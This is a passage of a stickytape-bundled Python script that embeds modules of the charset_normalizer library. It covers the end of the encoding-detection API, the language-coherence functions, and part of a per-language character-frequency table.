is_multi_byte_decoder else "strict",\n                )  # type: str\n            except UnicodeDecodeError as e:  # Lazy str loading may have missed something there\n                logger.log(\n                    TRACE,\n                    "LazyStr Loading: After MD chunk decode, code page %s does not fit given bytes sequence at ALL. %s",\n                    encoding_iana,\n                    str(e),\n                )\n                early_stop_count = max_chunk_gave_up\n                lazy_str_hard_failure = True\n                break\n\n            # multi-byte bad cutting detector and adjustment\n            # not the cleanest way to perform that fix but clever enough for now.\n            if is_multi_byte_decoder and i > 0 and sequences[i] >= 0x80:\n\n                chunk_partial_size_chk = min(chunk_size, 16)  # type: int\n\n                if (\n                    decoded_payload\n                    and chunk[:chunk_partial_size_chk] not in decoded_payload\n                ):\n                    for j in range(i, i - 4, -1):\n                        cut_sequence = sequences[j : i + chunk_size]\n\n                        if bom_or_sig_available and strip_sig_or_bom is False:\n                            cut_sequence = sig_payload + cut_sequence\n\n                        chunk = cut_sequence.decode(encoding_iana, errors="ignore")\n\n                        if chunk[:chunk_partial_size_chk] in decoded_payload:\n                            break\n\n            md_chunks.append(chunk)\n\n            md_ratios.append(mess_ratio(chunk, threshold))\n\n            if md_ratios[-1] >= threshold:\n                early_stop_count += 1\n\n            if (early_stop_count >= max_chunk_gave_up) or (\n                bom_or_sig_available and strip_sig_or_bom is False\n            ):\n                break\n\n        # We might want to check the sequence again with the whole content\n        # Only if initial MD tests passes\n        if (\n            not lazy_str_hard_failure\n            and is_too_large_sequence\n            and not is_multi_byte_decoder\n        ):\n            try:\n                sequences[int(50e3) :].decode(encoding_iana, errors="strict")\n            except UnicodeDecodeError as e:\n                logger.log(\n                    TRACE,\n                    "LazyStr Loading: After final lookup, code page %s does not fit given bytes sequence at ALL. %s",\n                    encoding_iana,\n                    str(e),\n                )\n                tested_but_hard_failure.append(encoding_iana)\n                continue\n\n        mean_mess_ratio = (\n            sum(md_ratios) / len(md_ratios) if md_ratios else 0.0\n        )  # type: float\n        if mean_mess_ratio >= threshold or early_stop_count >= max_chunk_gave_up:\n            tested_but_soft_failure.append(encoding_iana)\n            logger.log(\n                TRACE,\n                "%s was excluded because of initial chaos probing. Gave up %i time(s). "\n                "Computed mean chaos is %f %%.",\n                encoding_iana,\n                early_stop_count,\n                round(mean_mess_ratio * 100, ndigits=3),\n            )\n            # Preparing those fallbacks in case we got nothing.\n            if (\n                encoding_iana in ["ascii", "utf_8", specified_encoding]\n                and not lazy_str_hard_failure\n            ):\n                fallback_entry = CharsetMatch(\n                    sequences, encoding_iana, threshold, False, [], decoded_payload\n                )\n                if encoding_iana == specified_encoding:\n                    fallback_specified = fallback_entry\n                elif encoding_iana == "ascii":\n                    fallback_ascii = fallback_entry\n                else:\n                    fallback_u8 = fallback_entry\n            continue\n\n        logger.log(\n            TRACE,\n            "%s passed initial chaos probing. Mean measured chaos is %f %%",\n            encoding_iana,\n            round(mean_mess_ratio * 100, ndigits=3),\n        )\n\n        if not is_multi_byte_decoder:\n            target_languages = encoding_languages(encoding_iana)  # type: List[str]\n        else:\n            target_languages = mb_encoding_languages(encoding_iana)\n\n        if target_languages:\n            logger.log(\n                TRACE,\n                "{} should target any language(s) of {}".format(\n                    encoding_iana, str(target_languages)\n                ),\n            )\n\n        cd_ratios = []\n\n        # We shall skip the CD when its about ASCII\n        # Most of the time its not relevant to run "language-detection" on it.\n        if encoding_iana != "ascii":\n            for chunk in md_chunks:\n                chunk_languages = coherence_ratio(\n                    chunk, 0.1, ",".join(target_languages) if target_languages else None\n                )\n\n                cd_ratios.append(chunk_languages)\n\n        cd_ratios_merged = merge_coherence_ratios(cd_ratios)\n\n        if cd_ratios_merged:\n            logger.log(\n                TRACE,\n                "We detected language {} using {}".format(\n                    cd_ratios_merged, encoding_iana\n                ),\n            )\n\n        results.append(\n            CharsetMatch(\n                sequences,\n                encoding_iana,\n                mean_mess_ratio,\n                bom_or_sig_available,\n                cd_ratios_merged,\n                decoded_payload,\n            )\n        )\n\n        if (\n            encoding_iana in [specified_encoding, "ascii", "utf_8"]\n            and mean_mess_ratio < 0.1\n        ):\n            logger.debug(\n                "Encoding detection: %s is most likely the one.", encoding_iana\n            )\n            if explain:\n                logger.removeHandler(explain_handler)\n                logger.setLevel(previous_logger_level)\n            return CharsetMatches([results[encoding_iana]])\n\n        if encoding_iana == sig_encoding:\n            logger.debug(\n                "Encoding detection: %s is most likely the one as we detected a BOM or SIG within "\n                "the beginning of the sequence.",\n                encoding_iana,\n            )\n            if explain:\n                logger.removeHandler(explain_handler)\n                logger.setLevel(previous_logger_level)\n            return CharsetMatches([results[encoding_iana]])\n\n    if len(results) == 0:\n        if fallback_u8 or fallback_ascii or fallback_specified:\n            logger.log(\n                TRACE,\n                "Nothing got out of the detection process. Using ASCII/UTF-8/Specified fallback.",\n            )\n\n        if fallback_specified:\n            logger.debug(\n                "Encoding detection: %s will be used as a fallback match",\n                fallback_specified.encoding,\n            )\n            results.append(fallback_specified)\n        elif (\n            (fallback_u8 and fallback_ascii is None)\n            or (\n                fallback_u8\n                and fallback_ascii\n                and fallback_u8.fingerprint != fallback_ascii.fingerprint\n            )\n            or (fallback_u8 is not None)\n        ):\n            logger.debug("Encoding detection: utf_8 will be used as a fallback match")\n            results.append(fallback_u8)\n        elif fallback_ascii:\n            logger.debug("Encoding detection: ascii will be used as a fallback match")\n            results.append(fallback_ascii)\n\n    if results:\n        logger.debug(\n            "Encoding detection: Found %s as plausible (best-candidate) for content. With %i alternatives.",\n            results.best().encoding,  # type: ignore\n            len(results) - 1,\n        )\n    else:\n        logger.debug("Encoding detection: Unable to determine any suitable charset.")\n\n    if explain:\n        logger.removeHandler(explain_handler)\n        logger.setLevel(previous_logger_level)\n\n    return results\n\n\ndef from_fp(\n    fp: BinaryIO,\n    steps: int = 5,\n    chunk_size: int = 512,\n    threshold: float = 0.20,\n    cp_isolation: List[str] = None,\n    cp_exclusion: List[str] = None,\n    preemptive_behaviour: bool = True,\n    explain: bool = False,\n) -> CharsetMatches:\n    """\n    Same thing than the function from_bytes but using a file pointer that is already ready.\n    Will not close the file pointer.\n    """\n    return from_bytes(\n        fp.read(),\n        steps,\n        chunk_size,\n        threshold,\n        cp_isolation,\n        cp_exclusion,\n        preemptive_behaviour,\n        explain,\n    )\n\n\ndef from_path(\n    path: PathLike,\n    steps: int = 5,\n    chunk_size: int = 512,\n    threshold: float = 0.20,\n    cp_isolation: List[str] = None,\n    cp_exclusion: List[str] = None,\n    preemptive_behaviour: bool = True,\n    explain: bool = False,\n) -> CharsetMatches:\n    """\n    Same thing than the function from_bytes but with one extra step. Opening and reading given file path in binary mode.\n    Can raise IOError.\n    """\n    with open(path, "rb") as fp:\n        return from_fp(\n            fp,\n            steps,\n            chunk_size,\n            threshold,\n            cp_isolation,\n            cp_exclusion,\n            preemptive_behaviour,\n            explain,\n        )\n\n\ndef normalize(\n    path: PathLike,\n    steps: int = 5,\n    chunk_size: int = 512,\n    threshold: float = 0.20,\n    cp_isolation: List[str] = None,\n    cp_exclusion: List[str] = None,\n    preemptive_behaviour: bool = True,\n) -> CharsetMatch:\n    """\n    Take a (text-based) file path and try to create another file next to it, this time using UTF-8.\n    """\n    results = from_path(\n        path,\n        steps,\n        chunk_size,\n        threshold,\n        cp_isolation,\n        cp_exclusion,\n        preemptive_behaviour,\n    )\n\n    filename = basename(path)\n    target_extensions = list(splitext(filename))\n\n    if len(results) == 0:\n        raise IOError(\n            \'Unable to normalize "{}", no encoding charset seems to fit.\'.format(\n                filename\n            )\n        )\n\n    result = results.best()\n\n    target_extensions[0] += "-" + result.encoding  # type: ignore\n\n    with open(\n        "{}".format(str(path).replace(filename, "".join(target_extensions))), "wb"\n    ) as fp:\n        fp.write(result.output())  # type: ignore\n\n    return result  # type: ignore\n')
    __stickytape_write_module('charset_normalizer/cd.py', b'import importlib\nfrom codecs import IncrementalDecoder\nfrom collections import Counter, OrderedDict\nfrom functools import lru_cache\nfrom typing import Dict, List, Optional, Tuple\n\nfrom .assets import FREQUENCIES\nfrom .constant import KO_NAMES, LANGUAGE_SUPPORTED_COUNT, TOO_SMALL_SEQUENCE, ZH_NAMES\nfrom .md import is_suspiciously_successive_range\nfrom .models import CoherenceMatches\nfrom .utils import (\n    is_accentuated,\n    is_latin,\n    is_multi_byte_encoding,\n    is_unicode_range_secondary,\n    unicode_range,\n)\n\n\ndef encoding_unicode_range(iana_name: str) -> List[str]:\n    """\n    Return associated unicode ranges in a single byte code page.\n    """\n    if is_multi_byte_encoding(iana_name):\n        raise IOError("Function not supported on multi-byte code page")\n\n    decoder = importlib.import_module("encodings.{}".format(iana_name)).IncrementalDecoder  # type: ignore\n\n    p = decoder(errors="ignore")  # type: IncrementalDecoder\n    seen_ranges = {}  # type: Dict[str, int]\n    character_count = 0  # type: int\n\n    for i in range(0x40, 0xFF):\n        chunk = p.decode(bytes([i]))  # type: str\n\n        if chunk:\n            character_range = unicode_range(chunk)  # type: Optional[str]\n\n            if character_range is None:\n                continue\n\n            if is_unicode_range_secondary(character_range) is False:\n                if character_range not in seen_ranges:\n                    seen_ranges[character_range] = 0\n                seen_ranges[character_range] += 1\n                character_count += 1\n\n    return sorted(\n        [\n            character_range\n            for character_range in seen_ranges\n            if seen_ranges[character_range] / character_count >= 0.15\n        ]\n    )\n\n\ndef unicode_range_languages(primary_range: str) -> List[str]:\n    """\n    Return inferred languages used with a unicode range.\n    """\n    languages = []  # type: List[str]\n\n    for language, characters in FREQUENCIES.items():\n        for character in characters:\n            if unicode_range(character) == primary_range:\n                languages.append(language)\n                break\n\n    return languages\n\n\n@lru_cache()\ndef encoding_languages(iana_name: str) -> List[str]:\n    """\n    Single-byte encoding language association. Some code page are heavily linked to particular language(s).\n    This function does the correspondence.\n    """\n    unicode_ranges = encoding_unicode_range(iana_name)  # type: List[str]\n    primary_range = None  # type: Optional[str]\n\n    for specified_range in unicode_ranges:\n        if "Latin" not in specified_range:\n            primary_range = specified_range\n            break\n\n    if primary_range is None:\n        return ["Latin Based"]\n\n    return unicode_range_languages(primary_range)\n\n\n@lru_cache()\ndef mb_encoding_languages(iana_name: str) -> List[str]:\n    """\n    Multi-byte encoding language association. Some code page are heavily linked to particular language(s).\n    This function does the correspondence.\n    """\n    if (\n        iana_name.startswith("shift_")\n        or iana_name.startswith("iso2022_jp")\n        or iana_name.startswith("euc_j")\n        or iana_name == "cp932"\n    ):\n        return ["Japanese"]\n    if iana_name.startswith("gb") or iana_name in ZH_NAMES:\n        return ["Chinese", "Classical Chinese"]\n    if iana_name.startswith("iso2022_kr") or iana_name in KO_NAMES:\n        return ["Korean"]\n\n    return []\n\n\n@lru_cache(maxsize=LANGUAGE_SUPPORTED_COUNT)\ndef get_target_features(language: str) -> Tuple[bool, bool]:\n    """\n    Determine main aspects from a supported language if it contains accents and if is pure Latin.\n    """\n    target_have_accents = False  # type: bool\n    target_pure_latin = True  # type: bool\n\n    for character in FREQUENCIES[language]:\n        if not target_have_accents and is_accentuated(character):\n            target_have_accents = True\n        if target_pure_latin and is_latin(character) is False:\n            target_pure_latin = False\n\n    return target_have_accents, target_pure_latin\n\n\ndef alphabet_languages(\n    characters: List[str], ignore_non_latin: bool = False\n) -> List[str]:\n    """\n    Return associated languages associated to given characters.\n    """\n    languages = []  # type: List[Tuple[str, float]]\n\n    source_have_accents = any(is_accentuated(character) for character in characters)\n\n    for language, language_characters in FREQUENCIES.items():\n\n        target_have_accents, target_pure_latin = get_target_features(language)\n\n        if ignore_non_latin and target_pure_latin is False:\n            continue\n\n        if target_have_accents is False and source_have_accents:\n            continue\n\n        character_count = len(language_characters)  # type: int\n\n        character_match_count = len(\n            [c for c in language_characters if c in characters]\n        )  # type: int\n\n        ratio = character_match_count / character_count  # type: float\n\n        if ratio >= 0.2:\n            languages.append((language, ratio))\n\n    languages = sorted(languages, key=lambda x: x[1], reverse=True)\n\n    return [compatible_language[0] for compatible_language in languages]\n\n\ndef characters_popularity_compare(\n    language: str, ordered_characters: List[str]\n) -> float:\n    """\n    Determine if a ordered characters list (by occurrence from most appearance to rarest) match a particular language.\n    The result is a ratio between 0. (absolutely no correspondence) and 1. (near perfect fit).\n    Beware that is function is not strict on the match in order to ease the detection. (Meaning close match is 1.)\n    """\n    if language not in FREQUENCIES:\n        raise ValueError("{} not available".format(language))\n\n    character_approved_count = 0  # type: int\n\n    for character in ordered_characters:\n        if character not in FREQUENCIES[language]:\n            continue\n\n        characters_before_source = FREQUENCIES[language][\n            0 : FREQUENCIES[language].index(character)\n        ]  # type: List[str]\n        characters_after_source = FREQUENCIES[language][\n            FREQUENCIES[language].index(character) :\n        ]  # type: List[str]\n\n        characters_before = ordered_characters[\n            0 : ordered_characters.index(character)\n        ]  # type: List[str]\n        characters_after = ordered_characters[\n            ordered_characters.index(character) :\n        ]  # type: List[str]\n\n        before_match_count = [\n            e in characters_before for e in characters_before_source\n        ].count(\n            True\n        )  # type: int\n        after_match_count = [\n            e in characters_after for e in characters_after_source\n        ].count(\n            True\n        )  # type: int\n\n        if len(characters_before_source) == 0 and before_match_count <= 4:\n            character_approved_count += 1\n            continue\n\n        if len(characters_after_source) == 0 and after_match_count <= 4:\n            character_approved_count += 1\n            continue\n\n        if (\n            before_match_count / len(characters_before_source) >= 0.4\n            or after_match_count / len(characters_after_source) >= 0.4\n        ):\n            character_approved_count += 1\n            continue\n\n    return character_approved_count / len(ordered_characters)\n\n\ndef alpha_unicode_split(decoded_sequence: str) -> List[str]:\n    """\n    Given a decoded text sequence, return a list of str. Unicode range / alphabet separation.\n    Ex. a text containing English/Latin with a bit a Hebrew will return two items in the resulting list;\n    One containing the latin letters and the other hebrew.\n    """\n    layers = OrderedDict()  # type: Dict[str, str]\n\n    for character in decoded_sequence:\n        if character.isalpha() is False:\n            continue\n\n        character_range = unicode_range(character)  # type: Optional[str]\n\n        if character_range is None:\n            continue\n\n        layer_target_range = None  # type: Optional[str]\n\n        for discovered_range in layers:\n            if (\n                is_suspiciously_successive_range(discovered_range, character_range)\n                is False\n            ):\n                layer_target_range = discovered_range\n                break\n\n        if layer_target_range is None:\n            layer_target_range = character_range\n\n        if layer_target_range not in layers:\n            layers[layer_target_range] = character.lower()\n            continue\n\n        layers[layer_target_range] += character.lower()\n\n    return list(layers.values())\n\n\ndef merge_coherence_ratios(results: List[CoherenceMatches]) -> CoherenceMatches:\n    """\n    This function merge results previously given by the function coherence_ratio.\n    The return type is the same as coherence_ratio.\n    """\n    per_language_ratios = OrderedDict()  # type: Dict[str, List[float]]\n    for result in results:\n        for sub_result in result:\n            language, ratio = sub_result\n            if language not in per_language_ratios:\n                per_language_ratios[language] = [ratio]\n                continue\n            per_language_ratios[language].append(ratio)\n\n    merge = [\n        (\n            language,\n            round(\n                sum(per_language_ratios[language]) / len(per_language_ratios[language]),\n                4,\n            ),\n        )\n        for language in per_language_ratios\n    ]\n\n    return sorted(merge, key=lambda x: x[1], reverse=True)\n\n\n@lru_cache(maxsize=2048)\ndef coherence_ratio(\n    decoded_sequence: str, threshold: float = 0.1, lg_inclusion: Optional[str] = None\n) -> CoherenceMatches:\n    """\n    Detect ANY language that can be identified in given sequence. The sequence will be analysed by layers.\n    A layer = Character extraction by alphabets/ranges.\n    """\n\n    results = []  # type: List[Tuple[str, float]]\n    ignore_non_latin = False  # type: bool\n\n    sufficient_match_count = 0  # type: int\n\n    lg_inclusion_list = lg_inclusion.split(",") if lg_inclusion is not None else []\n    if "Latin Based" in lg_inclusion_list:\n        ignore_non_latin = True\n        lg_inclusion_list.remove("Latin Based")\n\n    for layer in alpha_unicode_split(decoded_sequence):\n        sequence_frequencies = Counter(layer)  # type: Counter\n        most_common = sequence_frequencies.most_common()\n\n        character_count = sum(o for c, o in most_common)  # type: int\n\n        if character_count <= TOO_SMALL_SEQUENCE:\n            continue\n\n        popular_character_ordered = [c for c, o in most_common]  # type: List[str]\n\n        for language in lg_inclusion_list or alphabet_languages(\n            popular_character_ordered, ignore_non_latin\n        ):\n            ratio = characters_popularity_compare(\n                language, popular_character_ordered\n            )  # type: float\n\n            if ratio < threshold:\n                continue\n            elif ratio >= 0.8:\n                sufficient_match_count += 1\n\n            results.append((language, round(ratio, 4)))\n\n            if sufficient_match_count >= 3:\n                break\n\n    return sorted(results, key=lambda x: x[1], reverse=True)\n')
    __stickytape_write_module('charset_normalizer/assets/__init__.py', b'# -*- coding: utf_8 -*-\nfrom collections import OrderedDict\n\nFREQUENCIES = OrderedDict(\n    [\n        (\n            "English",\n            [\n                "e",\n                "a",\n                "t",\n                "i",\n                "o",\n                "n",\n                "s",\n                "r",\n                "h",\n                "l",\n                "d",\n                "c",\n                "u",\n                "m",\n                "f",\n                "p",\n                "g",\n                "w",\n                "y",\n                "b",\n                "v",\n                "k",\n                "x",\n                "j",\n                "z",\n                "q",\n            ],\n        ),\n        (\n            "German",\n            [\n                "e",\n                "n",\n                "i",\n                "r",\n                "s",\n                "t",\n                "a",\n                "d",\n                "h",\n                "u",\n                "l",\n                "g",\n                "o",\n                "c",\n                "m",\n                "b",\n                "f",\n                "k",\n                "w",\n                "z",\n                "p",\n                "v",\n                "\xc3\xbc",\n                "\xc3\xa4",\n                "\xc3\xb6",\n                "j",\n            ],\n        ),\n        (\n            "French",\n            [\n                "e",\n                "a",\n                "s",\n                "n",\n                "i",\n                "t",\n                "r",\n                "l",\n                "u",\n                "o",\n                "d",\n                "c",\n                "p",\n                "m",\n                "\xc3\xa9",\n                "v",\n                "g",\n                "f",\n                "b",\n                "h",\n                "q",\n                "\xc3\xa0",\n                "x",\n                "\xc3\xa8",\n                "y",\n                "j",\n            ],\n        ),\n        (\n            "Dutch",\n            [\n                "e",\n                "n",\n                "a",\n                "i",\n                "r",\n                "t",\n                "o",\n                "d",\n                "s",\n                "l",\n                "g",\n                "h",\n                "v",\n                "m",\n                "u",\n                "k",\n                "c",\n                "p",\n                "b",\n                "w",\n                "j",\n                "z",\n                "f",\n                "y",\n                "x",\n                "\xc3\xab",\n            ],\n        ),\n        (\n            "Italian",\n            [\n                "e",\n                "i",\n                "a",\n                "o",\n                "n",\n                "l",\n                "t",\n                "r",\n                "s",\n                "c",\n                "d",\n                "u",\n                "p",\n                "m",\n                "g",\n                "v",\n                "f",\n                "b",\n                "z",\n                "h",\n                "q",\n                "\xc3\xa8",\n                "\xc3\xa0",\n                "k",\n                "y",\n                "\xc3\xb2",\n            ],\n        ),\n        (\n            "Polish",\n            [\n                "a",\n                "i",\n                "o",\n                "e",\n                "n",\n                "r",\n                "z",\n                "w",\n                "s",\n                "c",\n                "t",\n                "k",\n                "y",\n                "d",\n                "p",\n                "m",\n                "u",\n                "l",\n                "j",\n                "\xc5\x82",\n                "g",\n                "b",\n                "h",\n                "\xc4\x85",\n                "\xc4\x99",\n                "\xc3\xb3",\n            ],\n        ),\n        (\n            "Spanish",\n            [\n                "e",\n                "a",\n                "o",\n                "n",\n                "s",\n                "r",\n                "i",\n                "l",\n                "d",\n                "t",\n                "c",\n                "u",\n                "m",\n                "p",\n                "b",\n                "g",\n                "v",\n                "f",\n                "y",\n                "\xc3\xb3",\n                "h",\n                "q",\n                "\xc3\xad",\n                "j",\n                "z",\n                "\xc3\xa1",\n            ],\n        ),\n        (\n            "Russian",\n            [\n                "\xd0\xbe",\n                "\xd0\xb0",\n                "\xd0\xb5",\n                "\xd0\xb8",\n                "\xd0\xbd",\n                "\xd1\x81",\n                "\xd1\x82",\n                "\xd1\x80",\n                "\xd0\xb2",\n                "\xd0\xbb",\n                "\xd0\xba",\n                "\xd0\xbc",\n                "\xd0\xb4",\n                "\xd0\xbf",\n                "\xd1\x83",\n                "\xd0\xb3",\n                "\xd1\x8f",\n                "\xd1\x8b",\n                "\xd0\xb7",\n                "\xd0\xb1",\n                "\xd0\xb9",\n                "\xd1\x8c",\n                "\xd1\x87",\n                "\xd1\x85",\n                "\xd0\xb6",\n                "\xd1\x86",\n            ],\n        ),\n        (\n            "Japanese",\n            [\n                "\xe3\x81\xae",\n                "\xe3\x81\xab",\n                "\xe3\x82\x8b",\n                "\xe3\x81\x9f",\n                "\xe3\x81\xaf",\n                "\xe3\x83\xbc",\n                "\xe3\x81\xa8",\n                "\xe3\x81\x97",\n                "\xe3\x82\x92",\n                "\xe3\x81\xa7",\n                "\xe3\x81\xa6",\n                "\xe3\x81\x8c",\n                "\xe3\x81\x84",\n                "\xe3\x83\xb3",\n                "\xe3\x82\x8c",\n                "\xe3\x81\xaa",\n                "\xe5\xb9\xb4",\n                "\xe3\x82\xb9",\n                "\xe3\x81\xa3",\n                "\xe3\x83\xab",\n                "\xe3\x81\x8b",\n                "\xe3\x82\x89",\n                "\xe3\x81\x82",\n                "\xe3\x81\x95",\n                "\xe3\x82\x82",\n                "\xe3\x82\x8a",\n            ],\n        ),\n        (\n            "Portuguese",\n            [\n                "a",\n                "e",\n                "o",\n                "s",\n                "i",\n                "r",\n                "d",\n                "n",\n                "t",\n                "m",\n                "u",\n                "c",\n                "l",\n                "p",\n                "g",\n                "v",\n                "b",\n                "f",\n                "h",\n                "\xc3\xa3",\n                "q",\n                "\xc3\xa9",\n                "\xc3\xa7",\n                "\xc3\xa1",\n                "z",\n                "\xc3\xad",\n            ],\n        ),\n        (\n            "Swedish",\n            [\n                "e",\n                "a",\n                "n",\n                "r",\n                "t",\n                "s",\n                "i",\n                "l",\n                "d",\n                "o",\n                "m",\n                "k",\n                "g",\n                "v",\n                "h",\n                "f",\n                "u",\n                "p",\n                "\xc3\xa4",\n                "c",\n                "b",\n                "\xc3\xb6",\n                "\xc3\xa5",\n                "y",\n                "j",\n                "x",\n            ],\n        ),\n        (\n            "Chinese",\n            [\n                "\xe7\x9a\x84",\n                "\xe4\xb8\x80",\n                "\xe6\x98\xaf",\n                "\xe4\xb8\x8d",\n                "\xe4\xba\x86",\n                "\xe5\x9c\xa8",\n                "\xe4\xba\xba",\n                "\xe6\x9c\x89",\n                "\xe6\x88\x91",\n                "\xe4\xbb\x96",\n                "\xe8\xbf\x99",\n                "\xe4\xb8\xaa",\n                "\xe4\xbb\xac",\n                "\xe4\xb8\xad",\n                "\xe6\x9d\xa5",\n                "\xe4\xb8\x8a",\n                "\xe5\xa4\xa7",\n                "\xe4\xb8\xba",\n                "\xe5\x92\x8c",\n                "\xe5\x9b\xbd",\n                "\xe5\x9c\xb0",\n                "\xe5\x88\xb0",\n                "\xe4\xbb\xa5",\n                "\xe8\xaf\xb4",\n                "\xe6\x97\xb6",\n                "\xe8\xa6\x81",\n                "\xe5\xb0\xb1",\n                "\xe5\x87\xba",\n                "\xe4\xbc\x9a",\n            ],\n        ),\n        (\n            "Ukrainian",\n            [\n                "\xd0\xbe",\n                "\xd0\xb0",\n                "\xd0\xbd",\n                "\xd1\x96",\n                "\xd0\xb8",\n                "\xd1\x80",\n                "\xd0\xb2",\n                "\xd1\x82",\n                "\xd0\xb5",\n                "\xd1\x81",\n                "\xd0\xba",\n                "\xd0\xbb",\n                "\xd1\x83",\n                "\xd0\xb4",\n                "\xd0\xbc",\n                "\xd0\xbf",\n                "\xd0\xb7",\n                "\xd1\x8f",\n                "\xd1\x8c",\n                "\xd0\xb1",\n                "\xd0\xb3",\n                "\xd0\xb9",\n                "\xd1\x87",\n                "\xd1\x85",\n                "\xd1\x86",\n                "\xd1\x97",\n            ],\n        ),\n        (\n            "Norwegian",\n            [\n                "e",\n                "r",\n                "n",\n                "t",\n                "a",\n                "s",\n                "i",\n                "o",\n                "l",\n                "d",\n                "g",\n                "k",\n                "m",\n                "v",\n                "f",\n                "p",\n                "u",\n                "b",\n                "h",\n                "\xc3\xa5",\n                "y",\n                "j",\n                "\xc3\xb8",\n                "c",\n                "\xc3\xa6",\n                "w",\n            ],\n        ),\n        (\n            "Finnish",\n            [\n                "a",\n                "i",\n                "n",\n                "t",\n                "e",\n                "s",\n                "l",\n                "o",\n                "u",\n                "k",\n                "\xc3\xa4",\n                "m",\n                "r",\n                "v",\n                "j",\n                "h",\n                "p",\n                "y",\n                "d",\n                "\xc3\xb6",\n                "g",\n                "c",\n                "b",\n                "f",\n                "w",\n                "z",\n            ],\n        ),\n        (\n            "Vietnamese",\n            [\n                "n",\n                "h",\n                "t",\n                "i",\n                "c",\n                "g",\n                "a",\n                "o",\n                "u",\n                "m",\n                "l",\n                "r",\n                "\xc3\xa0",\n                "\xc4\x91",\n                "s",\n                "e",\n                "v",\n                "p",\n                "b",\n                "y",\n                "\xc6\xb0",\n                "d",\n                "\xc3\xa1",\n                "k",\n                "\xe1\xbb\x99",\n                "\xe1\xba\xbf",\n            ],\n        ),\n        (\n            "Czech",\n            [\n                "o",\n                "e",\n                "a",\n                "n",\n                "t",\n                "s",\n                "i",\n                "l",\n                "v",\n                "r",\n                "k",\n                "d",\n                "u",\n                "m",\n                "p",\n                "\xc3\xad",\n                "c",\n                "h",\n                "z",\n                "\xc3\xa1",\n                "y",\n                "j",\n                "b",\n                "\xc4\x9b",\n                "\xc3\xa9",\n                "\xc5\x99",\n            ],\n        ),\n        (\n            "Hungarian",\n            [\n                "e",\n                "a",\n                "t",\n                "l",\n                "s",\n                "n",\n                "k",\n                "r",\n                "i",\n                "o",\n                "z",\n                "\xc3\xa1",\n                "\xc3\xa9",\n                "g",\n                "m",\n                "b",\n                "y",\n                "v",\n                "d",\n                "h",\n                "u",\n                "p",\n                "j",\n                "\xc3\xb6",\n                "f",\n                "c",\n            ],\n        ),\n        (\n            "Korean",\n            [\n                "\xec\x9d\xb4",\n                "\xeb\x8b\xa4",\n                "\xec\x97\x90",\n                "\xec\x9d\x98",\n                "\xeb\x8a\x94",\n                "\xeb\xa1\x9c",\n                "\xed\x95\x98",\n                "\xec\x9d\x84",\n                "\xea\xb0\x80",\n                "\xea\xb3\xa0",\n                "\xec\xa7\x80",\n                "\xec\x84\x9c",\n                "\xed\x95\x9c",\n                "\xec\x9d\x80",\n                "\xea\xb8\xb0",\n                "\xec\x9c\xbc",\n                "\xeb\x85\x84",\n                "\xeb\x8c\x80",\n                "\xec\x82\xac",\n                "\xec\x8b\x9c",\n                "\xeb\xa5\xbc",\n                "\xeb\xa6\xac",\n                "\xeb\x8f\x84",\n                "\xec\x9d\xb8",\n                "\xec\x8a\xa4",\n                "\xec\x9d\xbc",\n            ],\n        ),\n        (\n            "Indonesian",\n            [\n                "a",\n                "n",\n                "e",\n                "i",\n                "r",\n                "t",\n                "u",\n                "s",\n                "d",\n                "k",\n                "m",\n                "l",\n                "g",\n                "p",\n                "b",\n                "o",\n                "h",\n                "y",\n                "j",\n                "c",\n                "w",\n                "f",\n                "v",\n                "z",\n                "x",\n                "q",\n            ],\n        ),\n        (\n            "Turkish",\n            [\n                "a",\n                "e",\n                "i",\n                "n",\n                "r",\n                "l",\n                "\xc4\xb1",\n                "k",\n                "d",\n                "t",\n                "s",\n                "m",\n                "y",\n                "u",\n                "o",\n                "b",\n                "\xc3\xbc",\n                "\xc5\x9f",\n                "v",\n                "g",\n                "z",\n                "h",\n                "c",\n                "p",\n                "\xc3\xa7",\n                "\xc4\x9f",\n            ],\n        ),\n        (\n            "Romanian",\n            [\n                "e",\n                "i",\n                "a",\n                "r",\n                "n",\n                "t",\n                "u",\n                "l",\n                "o",\n                "c",\n                "s",\n                "d",\n                "p",\n                "m",\n                "\xc4\x83",\n                "f",\n                "v",\n                "\xc3\xae",\n                "g",\n                "b",\n                "\xc8\x99",\n                "\xc8\x9b",\n                "z",\n                "h",\n                "\xc3\xa2",\n                "j",\n            ],\n        ),\n        (\n            "Farsi",\n            [\n                "\xd8\xa7",\n                "\xdb\x8c",\n                "\xd8\xb1",\n                "\xd8\xaf",\n                "\xd9\x86",\n                "\xd9\x87",\n                "\xd9\x88",\n                "\xd9\x85",\n                "\xd8\xaa",\n                "\xd8\xa8",\n                "\xd8\xb3",\n                "\xd9\x84",\n                "\xda\xa9",\n                "\xd8\xb4",\n                "\xd8\xb2",\n                "\xd9\x81",\n                "\xda\xaf",\n                "\xd8\xb9",\n                "\xd8\xae",\n                "\xd9\x82",\n                "\xd8\xac",\n                "\xd8\xa2",\n                "\xd9\xbe",\n                "\xd8\xad",\n                "\xd8\xb7",\n                "\xd8\xb5",\n            ],\n        ),\n        (\n            "Arabic",\n            [\n                "\xd8\xa7",\n                "\xd9\x84",\n                "\xd9\x8a",\n                "\xd9\x85",\n                "\xd9\x88",\n                "\xd9\x86",\n                "\xd8\xb1",\n                "\xd8\xaa",\n                "\xd8\xa8",\n                "\xd8\xa9",\n                "\xd8\xb9",\n                "\xd8\xaf",\n                "\xd8\xb3",\n                "\xd9\x81",\n                "\xd9\x87",\n                "\xd9\x83",\n                "\xd9\x82",\n                "\xd8\xa3",\n                "\xd8\xad",\n                "\xd8\xac",\n                "\xd8\xb4",\n                "\xd8\xb7",\n                "\xd8\xb5",\n                "\xd9\x89",\n                "\xd8\xae",\n                "\xd8\xa5",\n            ],\n        ),\n        (\n            "Danish",\n            [\n                "e",\n                "r",\n                "n",\n                "t",\n                "a",\n                "i",\n                "s",\n                "d",\n                "l",\n                "o",\n                "g",\n                "m",\n                "k",\n                "f",\n                "v",\n                "u",\n                "b",\n                "h",\n                "p",\n                "\xc3\xa5",\n                "y",\n                "\xc3\xb8",\n                "\xc3\xa6",\n                "c",\n                "j",\n                "w",\n            ],\n        ),\n        (\n            "Serbian",\n            [\n                "\xd0\xb0",\n                "\xd0\xb8",\n                "\xd0\xbe",\n                "\xd0\xb5",\n                "\xd0\xbd",\n                "\xd1\x80",\n                "\xd1\x81",\n                "\xd1\x83",\n                "\xd1\x82",\n                "\xd0\xba",\n                "\xd1\x98",\n                "\xd0\xb2",\n                "\xd0\xb4",\n                "\xd0\xbc",\n                "\xd0\xbf",\n                "\xd0\xbb",\n                "\xd0\xb3",\n                "\xd0\xb7",\n                "\xd0\xb1",\n                